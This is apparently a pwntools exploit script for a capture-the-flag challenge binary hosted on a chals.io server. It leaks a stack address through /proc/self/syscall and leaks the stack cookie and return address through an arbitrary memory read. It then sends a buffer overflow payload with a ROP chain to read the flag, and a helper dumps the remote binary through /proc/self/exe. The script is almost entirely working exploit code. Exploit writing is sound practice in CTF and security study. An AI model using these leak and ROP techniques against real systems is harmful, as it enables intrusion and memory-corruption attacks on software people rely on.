from pwn import ELF, process, ROP, remote, ssh, gdb, cyclic, cyclic_find, log, p64, u64, p32, u32
import sys

# ln -s /usr/bin/pwndbg pwntools-gdb
# export PATH=$PWD:$PATH

LOCAL_BIN = "./allmant_underligt_extraordinart_verktyg"

def test():
    ELF_LOADED = ELF(LOCAL_BIN)
    if True:
        P = process(LOCAL_BIN)
        if False:
            gdb.attach(P.pid, """
#b *(read_mem+337)
#b *(read_file+522)
b *(read_file+310)
#display/x *(int*)($ebp-0xc)
#display/i $pc
c
""")
    else:
        P = remote('undutmaning-ab915c4cdadc-allmant-0.chals.io', 443, ssl=True)
    filename = b"/proc/self/syscall"
    P.sendline(b"1")
    P.recvuntil(b"Filename: ")
    P.sendline(filename)
    P.recvuntil(b"nr of bytes: ")
    P.sendline(b"144")
    suff = b"EOF "+filename
    data = P.recvuntil(suff)[:-len(suff)-1]
    addr = int(data.split()[2], 16)
    cookie_addr = addr + 0x90
    print( "cookie_addr", hex(cookie_addr) )
    P.sendline(b"2")
    P.recvuntil(b"Addr: ")
    P.sendline(hex(cookie_addr).encode())
    mem = P.recvuntil(b"EOM")[:-4]
    #print(mem)
    replace = mem[0:16]
    cookie = u32(mem[0:4])
    ebp = u32(mem[12:16])
    original_ret = u32(mem[16:20])
    base_addr = original_ret - 0x128 - 0x00001827
    base_addr_ghidra = base_addr - 0x00010000
    ELF_LOADED.address = base_addr
    ROP_LOADED = ROP(ELF_LOADED)
    print("cookie", hex(cookie))
    print("original_ret", hex(original_ret))
    print("main", hex(ELF_LOADED.symbols["main"]))
    P.recvuntil(b"Choice: ")
    P.sendline(b"1")
    filename = b"/proc/self/fd/0"
    P.sendline(filename)
    P.recvuntil(b"nr of bytes: ")
    P.sendline(b"-1")
    #payload = cyclic(256)
    #payload = b"A"*144+p32(cookie)+b"B"*12+p32(0xdeadbeef)
    read_file_addr = ELF_LOADED.symbols["read_file"] + 310
    got = ELF_LOADED.symbols["_GLOBAL_OFFSET_TABLE_"]
    pop_ebx = (ROP_LOADED.find_gadget(['pop ebx', 'ret']))[0]
    flag = base_addr_ghidra + 0x0012015
    prev_ebp = ebp - 0x40020
    payload = b"A"*144+p32(cookie)+b"B"*8+p32(prev_ebp)+p32(pop_ebx)+p32(got)+p32(read_file_addr)+p32(flag)+p32(0x0)+b"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXx"
    P.sendline(payload)
    P.interactive()

def dump(filename, size=-1):
    P = remote('undutmaning-ab915c4cdadc-allmant-0.chals.io', 443, ssl=True)
    P.sendline(b"1")
    P.recvuntil(b"Filename: ")
    P.sendline(filename)
    P.recvuntil(b"nr of bytes: ")
    P.sendline(str(size).encode())
    suff = b"EOF "+filename
    data = P.recvuntil(suff)[:-len(suff)-1]
    return data

if False:    
    f = open("allmant_underligt_extraordinart_verktyg", "wb")
    f.write(dump(b"/proc/self/exe"))
    f.close()

#print(dump(sys.argv[1].encode()).decode())

test()

